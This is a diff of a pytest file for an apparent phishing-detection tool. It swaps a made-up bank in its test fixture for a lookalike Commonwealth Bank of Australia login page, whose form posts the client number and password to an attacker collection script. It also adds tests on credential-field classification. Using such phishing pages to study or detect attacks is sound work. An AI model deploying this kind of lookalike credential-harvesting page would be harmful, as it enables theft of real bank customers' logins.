@@ -9,11 +9,11 @@ import pytest  # noqa: E402
 
 from phishfaith import citation_view, grounding, interventions, parse  # noqa: E402
 
-URL = "http://northbank-secure-login.rr7.tk/verify"
-HTML = """<html><head><title>NorthBank</title></head><body>
+URL = "http://commbank-netbank-secure.rr7.tk/logon"
+HTML = """<html><head><title>CommBank</title></head><body>
 <form action="http://rr7.tk/collect.php" method="post">
-<input type="text" name="username"><input type="password" name="pin">
-<button>Sign in</button></form><p>&copy; 2019 NorthBank Ltd.</p></body></html>"""
+<input type="text" name="clientnumber"><input type="password" name="password">
+<button>Log on</button></form><p>&copy; 2019 Commonwealth Bank of Australia</p></body></html>"""
 
 
 @pytest.fixture
@@ -82,6 +82,23 @@ def test_domain_intervention_is_flagged_as_not_label_preserving(view):
     _, iv = interventions.build_c2(view, "U1")
     assert iv.kind == interventions.DECISION_EVIDENCE
     assert interventions.NEUTRAL_HOST in iv.after
+
+
+def test_matched_control_prefers_same_tag_over_same_kind(view):
+    """The operator follows the tag, so a same-tag candidate must win.
+
+    The password field and the form are both `credential`, but only another
+    <input> can take C2's operator.
+    """
+    pw = next(s.source_id for s in view.sources.values() if s.attrs.get("type") == "password")
+    matched = interventions.pick_matched_uncited(view, {"U1", pw}, pw)
+    assert view.sources[matched].tag == "input"
+
+
+def test_bank_client_number_counts_as_a_credential_field(view):
+    """"client number" is what CommBank asks for; a user/email word list misses it."""
+    field = next(s for s in view.sources.values() if s.attrs.get("name") == "clientnumber")
+    assert field.kind == "credential"
 
 
 def test_c3_flags_an_unmatched_operator(view):
